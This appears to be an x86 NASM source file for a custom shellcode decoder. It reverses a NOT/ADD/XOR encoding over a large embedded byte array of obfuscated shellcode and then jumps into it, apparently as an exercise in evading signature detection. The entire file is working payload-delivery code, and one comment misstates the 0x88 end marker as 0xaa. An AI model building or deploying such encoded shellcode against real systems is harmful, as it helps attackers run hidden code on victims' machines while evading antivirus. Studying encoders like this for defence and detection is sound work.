[BITS 32]

global _start                 

section .text

_start:
        jmp short call_shellcode

decoder_setup:
        pop esi                    ; pop shellcode into esi

decode:
        cmp byte [esi], 0x88       ; compare current esi byte with our 0xaa marker
        jz shellcode               ; if compare succeeds, jump to shellcode
        not byte [esi]             ; NOT operation of current byte in esi
        add byte [esi], 0x02       ; ADD 0x02
        xor byte [esi], 0x97       ; XOR 0x97
        add byte [esi], 0x10       ; ADD 0x10
        xor byte [esi], 0x88       ; XOR 0x88
        inc esi                    ; move to next byte in esi
        jmp short decode           ; jump back to start of decode


call_shellcode:
        call decoder_setup         ; pushes shellcode to stack and jumps to decoder_setup
        shellcode: db 0x0e,0x3a,0x94,0x12,0x12,0x12,0xb2,0x9b,0x37,0xc3,0x52,0xb6,0x9d,0xa2,0xc2,0x9d,0xa4,0x1e,0x9d,0xa4,0xe6,0x9d,0x84,0xfa,0x21,0x49,0xdc,0xf8,0xc3,0x11,0x7e,0xce,0xb3,0x8e,0x14,0xfe,0xf2,0x53,0x61,0x1f,0x13,0x59,0x34,0x04,0xa4,0xa9,0x9d,0xa4,0xe2,0x9d,0xdc,0xce,0x9d,0xde,0xe3,0x8a,0x35,0xda,0x13,0x23,0xa3,0x9d,0xab,0xf2,0x13,0x25,0x9d,0xdb,0xea,0x35,0xcc,0xdb,0x9d,0xc6,0x9d,0x13,0x28,0xc3,0x11,0x7e,0x53,0x61,0x1f,0x13,0x59,0xca,0x32,0x87,0x08,0x15,0x8f,0x0a,0xcd,0x8f,0xf6,0x87,0x36,0xaa,0x9d,0xaa,0xf6,0x13,0x25,0xb8,0x9d,0x1e,0xdd,0x9d,0xaa,0xee,0x13,0x25,0x9d,0x16,0x9d,0x13,0x22,0x9b,0xd6,0xf6,0xf6,0xad,0xad,0xb3,0xab,0xac,0xa3,0x11,0x32,0xb1,0xb1,0xac,0x9d,0xe4,0x3d,0x9f,0xaf,0xba,0xc5,0xc4,0x12,0x12,0xba,0x89,0x85,0xc4,0xb1,0xa6,0xba,0xde,0x89,0xf8,0x19,0x11,0x27,0x4a,0x62,0x13,0x12,0x12,0xfb,0x56,0xa6,0xa2,0xba,0xfb,0x92,0xbd,0x12,0x11,0x27,0xa2,0xa2,0xa2,0xa2,0xd2,0xa2,0xd2,0xa2,0xba,0x3c,0x21,0x31,0x32,0x11,0x27,0x69,0xbc,0x17,0xba,0x52,0x7a,0x86,0x59,0xba,0x14,0x12,0x13,0x4d,0x9b,0x38,0xbc,0xe2,0xa8,0xa9,0xba,0x6b,0x77,0x86,0xb3,0x11,0x27,0x97,0x52,0x86,0x1e,0x11,0xe0,0x1a,0x87,0x3e,0xba,0x02,0x47,0x74,0xa8,0x11,0x27,0xba,0xb5,0xbf,0xb6,0x12,0x9b,0x35,0xa9,0xa9,0xa9,0xc3,0x08,0xbc,0xe4,0xab,0xa8,0x34,0x0f,0xb8,0x59,0xd6,0xf6,0xce,0x13,0x13,0x9f,0xd6,0xf6,0xe2,0x58,0x12,0xd6,0xa6,0xa2,0xa8,0xa8,0xa8,0xd8,0xa8,0xe0,0xa8,0xa8,0xa5,0xa8,0xba,0x8b,0x5e,0xd1,0x98,0x11,0x27,0x9b,0x32,0xe0,0xa8,0xd8,0x11,0xc2,0xba,0x1a,0x99,0xef,0xb2,0x11,0x27,0x4d,0x02,0x47,0x74,0xa8,0xba,0x78,0x67,0x4f,0x6f,0x11,0x27,0xce,0x18,0x8e,0x1c,0x92,0x0d,0x32,0x87,0x17,0x4d,0xd9,0xe5,0x84,0xc1,0xbc,0x12,0xa5,0x11,0x27,0x88
